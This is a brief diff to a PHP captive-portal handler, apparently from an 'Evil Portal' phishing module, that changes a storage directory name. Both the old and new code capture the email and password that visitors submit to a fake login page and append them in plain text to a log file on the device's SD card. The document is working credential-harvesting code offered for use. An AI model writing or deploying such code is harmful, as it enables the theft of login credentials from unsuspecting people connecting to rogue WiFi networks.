@@ -5,13 +5,13 @@ class MyPortal extends Portal
 
     public function handleAuthorization()
     {
-        if (!is_dir('/sd/evilportal-input/')) {
+        if (!is_dir('/sd/evilportal-logs/')) {
 
-          mkdir('/sd/evilportal-input/');
+          mkdir('/sd/evilportal-logs/');
         }
 
         if (isset($_POST['email'])) {
-          file_put_contents("/sd/evilportal-input/social-login.txt", $_POST['email'] . ' : ' . $_POST['password'] . "\n", FILE_APPEND);
+          file_put_contents("/sd/evilportal-logs/social-login.txt", $_POST['email'] . ' : ' . $_POST['password'] . "\n", FILE_APPEND);
         }
         // handle form input or other extra things there
 
